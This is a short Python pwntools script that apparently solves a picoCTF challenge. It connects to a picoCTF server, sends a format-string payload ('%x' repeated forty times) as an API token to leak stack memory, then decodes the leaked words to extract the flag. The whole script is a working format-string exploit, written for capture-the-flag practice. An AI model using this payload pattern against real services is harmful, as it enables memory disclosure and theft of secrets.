from pwn import *

# Establish connection
conn = remote('mercury.picoctf.net', 33411)

# Route to the exploit
conn.sendlineafter('2) View my portfolio\n', '1')
conn.recvuntil('What is your API token?\n')

# Exploit
conn.send('%x' + '.%x' * 40 + '\n')

# Route to the leak
conn.recvuntil('Buying stonks with token:\n')
# Get the data
stack = conn.recvline(False).decode()

# Parse the data
result = b''
for h in stack.split('.'):
    result += p32(int(h, 16))

# Extract the flag
flag = result[result.find(b'picoCTF{'):result.find(b'}') + 1].decode()

# Print the flag
print(flag)
